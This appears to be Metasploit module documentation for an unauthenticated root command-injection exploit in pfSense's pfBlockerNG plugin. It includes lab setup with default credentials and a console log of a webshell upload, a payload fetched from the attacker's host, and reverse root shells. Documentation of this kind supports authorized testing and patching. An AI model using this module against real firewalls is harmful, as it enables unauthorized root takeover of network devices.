## Vulnerable Application

### Description
This module exploits a vulnerability in the pfSense plugin, pfBlockerNG that allows remote unauthenticated
attackers to execute execute arbitrary OS commands as root via shell metacharacters in the HTTP Host header.
Versions =< 2.1.4_26 are vulnerable, note that version 3.X is unaffected.

### Setup
Download the pfSense image:

`wget https://atxfiles.netgate.com/mirror/downloads/pfSense-CE-2.5.2-RELEASE-amd64.iso.gz`

To obtain a vulnerable copy of the pfBlockerNG plugin, you can build it from source from the [official pfSense github
repo](https://github.com/pfsense/FreeBSD-ports/tree/devel/net/pfSense-pkg-pfBlockerNG), or it can be downloaded from
the following link:

`wget https://files01.netgate.com/pkg/pfSense_plus-v21_09_aarch64-pfSense_plus_v21_09/All/pfSense-pkg-pfBlockerNG-2.1.4_26.pkg`


Install the .iso file in your favorite virtualizing software. Once installed pfSense will start and you can accesss the
web GUI by navigating to `https://<pfSense-IP-address>/`

Sign into the application with username: `admin` password: `pfsense`

Now at the top of the screen select System -> Advanced. Scroll down to the section named Secure Shell and tick the box
beside `Enable Secure Shell`.

From your host machine we can now transfer the vulnerable package to the pfSense VM using `scp`

`scp pfSense-pkg-pfBlockerNG-2.1.4_26.pkg root@<pfSense-IP-address>:/`

(the root password of the VM will be the same as the admin password: `pfsense`)

Install the vulnerble package with:
`pkg install pfSense-pkg-pfBlockerNG-2.1.4_26.pkg`

## Options

**WEBSHELL_NAME**

This is the name of the webshell that will get uploaded to the pfsense target. If left unset the file name will get
randomly generated with a random length of either 5, 8, 11, 14 or 17 plus the file extention .php. In order to successfully
land the webshell on the target the webshell filename needs to be of the length specified above, please keep this in
mind when setting the webshell name.

## Verification Steps

1. Start msfconsole
1. Do: `use unix/http/pfsense_pfblockerng_webshell`
1. Set the `RHOST`, `LHOST` options
1. Run the module
1. Receive a cmd shell as the root user

## Scenarios
### pfSense 2.5.2-RELEASE with pfSense-pkg-pfBlockerNG-2.1.4_26.pkg installed
```
msf6 > use unix/http/pfsense_pfblockerng_webshell
[*] Using configured payload bsd/x64/shell_reverse_tcp
msf6 exploit(unix/http/pfsense_pfblockerng_webshell) > set rhosts 172.16.199.131
rhosts => 172.16.199.131
msf6 exploit(unix/http/pfsense_pfblockerng_webshell) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(unix/http/pfsense_pfblockerng_webshell) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Uploading shell...
[*] Webshell name is: BrNGc.php
[+] Upload succeeded, response from running id command: uid=0(root) gid=0(wheel) groups=0(wheel)

[*] Executing BSD Dropper for bsd/x64/shell_reverse_tcp
[*] Using URL: http://172.16.199.1:8080/EYFwssRWAhtL
[*] Client 172.16.199.131 (curl/7.76.1) requested /EYFwssRWAhtL
[*] Sending payload to 172.16.199.131 (curl/7.76.1)
[*] Command shell session 4 opened (172.16.199.1:4444 -> 172.16.199.131:2036) at 2022-09-15 17:15:04 -0400
[*] Command Stager progress - 100.00% done (117/117 bytes)
[*] Server stopped.

id
uid=0(root) gid=0(wheel) groups=0(wheel)
uname -a
FreeBSD pfSense.home.arpa 12.2-STABLE FreeBSD 12.2-STABLE fd0f54f44b5c(RELENG_2_5_0) pfSense  amd64
^C
Abort session 4? [y/N]  y

[*] 172.16.199.131 - Command shell session 4 closed.  Reason: User exit
msf6 exploit(unix/http/pfsense_pfblockerng_webshell) > set target 0
target => 0
msf6 exploit(unix/http/pfsense_pfblockerng_webshell) > run

[*] Started reverse double SSL handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Uploading shell...
[*] Webshell name is: mTENCpIHTIl.php
[+] Upload succeeded, response from running id command: uid=0(root) gid=0(wheel) groups=0(wheel)

[*] Executing Unix Command for cmd/unix/reverse_openssl
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo kcejSRsHIm1IaTNd;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "kcejSRsHIm1IaTNd\n"
[*] Matching...
[*] B is input...
[*] Command shell session 5 opened (172.16.199.1:4444 -> 172.16.199.131:51321) at 2022-09-15 17:16:07 -0400

id
uid=0(root) gid=0(wheel) groups=0(wheel)
uname -a
FreeBSD pfSense.home.arpa 12.2-STABLE FreeBSD 12.2-STABLE fd0f54f44b5c(RELENG_2_5_0) pfSense  amd64
```

